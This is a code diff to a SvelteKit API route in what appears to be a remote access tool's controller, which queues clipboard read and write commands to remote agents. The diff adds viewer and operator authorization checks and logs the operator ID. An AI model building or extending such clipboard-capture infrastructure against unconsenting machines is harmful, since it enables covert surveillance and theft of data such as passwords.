@@ -2,6 +2,7 @@ import { json, error } from '@sveltejs/kit';
 import type { RequestHandler } from './$types';
 import { clipboardManager, ClipboardError } from '$lib/server/rat/clipboard';
 import { registry, RegistryError } from '$lib/server/rat/store';
+import { requireOperator, requireViewer } from '$lib/server/authorization';
 import type {
 	ClipboardCommandPayload,
 	ClipboardContent,
@@ -36,11 +37,13 @@ function assertClipboardContent(
 	}
 }
 
-export const GET: RequestHandler = ({ params }) => {
+export const GET: RequestHandler = ({ params, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	requireViewer(locals.user);
 
 	const state = clipboardManager.getState(id);
 	const triggers = clipboardManager.listTriggers(id);
@@ -49,11 +52,13 @@ export const GET: RequestHandler = ({ params }) => {
 	return json({ state, triggers, events } satisfies ClipboardStateResponse);
 };
 
-export const POST: RequestHandler = async ({ params, request }) => {
+export const POST: RequestHandler = async ({ params, request, locals }) => {
 	const id = params.id;
 	if (!id) {
 		throw error(400, 'Missing agent identifier');
 	}
+
+	const user = requireOperator(locals.user);
 
 	let payload: ClipboardActionRequest;
 	try {
@@ -73,7 +78,7 @@ export const POST: RequestHandler = async ({ params, request }) => {
 			const { requestId, wait } = clipboardManager.createRequest(id, waitMs);
 			try {
 				const command: ClipboardCommandPayload = { action: 'get', requestId };
-				registry.queueCommand(id, { name: 'clipboard', payload: command });
+				registry.queueCommand(id, { name: 'clipboard', payload: command }, { operatorId: user.id });
 			} catch (err) {
 				if (err instanceof RegistryError) {
 					clipboardManager.failPending(id, requestId, new ClipboardError(err.message, err.status));
@@ -107,7 +112,7 @@ export const POST: RequestHandler = async ({ params, request }) => {
 					content: payload.content,
 					source: payload.source ?? 'controller'
 				};
-				registry.queueCommand(id, { name: 'clipboard', payload: command });
+				registry.queueCommand(id, { name: 'clipboard', payload: command }, { operatorId: user.id });
 			} catch (err) {
 				if (err instanceof RegistryError) {
 					clipboardManager.failPending(id, requestId, new ClipboardError(err.message, err.status));
